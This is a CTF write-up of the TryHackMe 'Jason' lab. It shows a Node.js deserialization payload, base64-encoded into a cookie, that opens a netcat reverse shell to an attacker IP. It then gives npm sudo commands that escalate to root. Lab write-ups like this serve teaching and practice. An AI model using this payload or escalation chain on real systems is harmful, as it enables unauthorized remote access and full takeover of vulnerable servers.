---
title: Jason - Writeup
author: Elman Alizadeh
date: 2021-04-27 14:10:00 +0800
categories: [ctf, TryHackMe]
tags: [tryhackme, jason]
---

Today we will take a look at TryHackMe: Jason. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/thm-jason/1.jpeg" | relative_url }})

## Network scan

Command: sudo nmap -sS -sC -sV -oN nmap/initial 10.10.192.78

![Desktop View]({{ "/assets/img/thm-jason/1.png" | relative_url }})

## Website enum
Let’s take a look at the website.

![Desktop View]({{ "/assets/img/thm-jason/2.png" | relative_url }})

Let’s enter something and look at the query with burp

![Desktop View]({{ "/assets/img/thm-jason/3.png" | relative_url }})

And we see it is built with node js . I figured there would be a vulnerability related to json & node.js . So I researched a bit and found out there is a RCE vulnerability .

[NodeJs](https://book.hacktricks.xyz/pentesting-web/deserialization#nodejs)

I have prepared such a code for operation.

```console
{“email”:”test”,”rce”:”_$$ND_FUNC$$_function(){ require(‘child_process’).exec(‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $IP 4444 >/tmp/f’, function(error, stdout, stderr) { console.log(stdout) }); }()”}
```

Since we have to use cookies, I encrypt with base64.

![Desktop View]({{ "/assets/img/thm-jason/4.png" | relative_url }})

Let’s paste to the cookie and listen.

![Desktop View]({{ "/assets/img/thm-jason/5.png" | relative_url }})

When we refresh the page, we get a shell.

![Desktop View]({{ "/assets/img/thm-jason/6.png" | relative_url }})

## Privilege Escalation

Comman: sudo -l

Let’s exploit

[npm](https://gtfobins.github.io/gtfobins/npm/)

Command: TF=$(mktemp -d)

Command: echo ‘{“scripts”: {“preinstall”: “/bin/bash”}}’ > $TF/package.json

Command: sudo /usr/bin/npm -C $TF --unsafe-perm i

![Desktop View]({{ "/assets/img/thm-jason/7.png" | relative_url }})

# And now we are the root

![Desktop View]({{ "/assets/img/thm-jason/1.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”







